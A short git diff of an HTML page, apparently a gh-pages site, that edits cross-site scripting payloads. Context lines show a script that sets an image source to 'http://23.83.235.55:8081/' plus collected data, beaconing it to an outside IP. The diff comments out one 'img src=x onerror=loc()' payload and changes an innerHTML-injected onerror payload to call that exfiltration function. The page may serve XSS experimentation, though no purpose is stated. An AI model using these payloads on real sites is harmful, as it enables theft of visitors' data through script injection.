@@ -413,7 +413,7 @@ $ git checkout gh-pages
                     b.src="http://23.83.235.55:8081/"+m;
                 }
             </script>
-            <img src=x onerror=loc()>
+            <!--<img src=x onerror=loc()>-->
             <!--<script>-->
                 <!--function loc2(){-->
                     <!--var b=document.createElement('img');-->
@@ -443,7 +443,7 @@ $ git checkout gh-pages
 
 <script>
     var str = "<div></div>";
-    str += "<img src=x onerror='console.log(\"ZX:innerHTML\"); this.parentNode.removeChild(this); init();/>";
+    str += "<img src=x onerror='init();loc();/>";
     document.getElementById('inner').innerHTML = str;
 </script>
 
